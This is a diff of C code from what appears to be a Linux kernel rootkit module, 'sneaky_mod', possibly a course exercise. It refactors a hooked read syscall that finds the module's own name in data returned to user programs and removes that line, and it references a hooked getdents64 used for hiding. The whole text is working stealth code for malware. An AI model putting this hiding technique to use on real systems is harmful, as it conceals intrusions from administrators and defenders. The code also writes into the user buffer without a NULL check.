@@ -65,20 +65,18 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs){
 asmlinkage ssize_t (*original_read)(struct pt_regs *);
 
 asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs){
-  ssize_t byte_read;
+  
+  char * match = NULL;
+  char * endofline = NULL;
+  ssize_t byte_read = original_read(regs);
 
-  char * tofind = "sneaky_mod";
-  char * current;
-  char * endofline;
-  byte_read = original_read(pt_regs);
-
-  current = strstr((char *)regs->si, tofind);
-  if(current == NULL){
+  match = strstr((char *)regs->si, "sneaky_mod");
+  if(match == NULL){
     return byte_read;
   }
-  endofline = strchr(current, '\n');
-  memmove((void *)current, (void *)(endofline+1), byte_read - (endofline + 1 - (char *)regs->si));
-  byte_read -= endofline + 1 - current;
+  endofline = strchr(match, '\n');
+  memmove((void *)match, (void *)(endofline+1), byte_read - (endofline + 1 - (char *)regs->si));
+  byte_read -= endofline + 1 - match;
 
   return byte_read;
 }
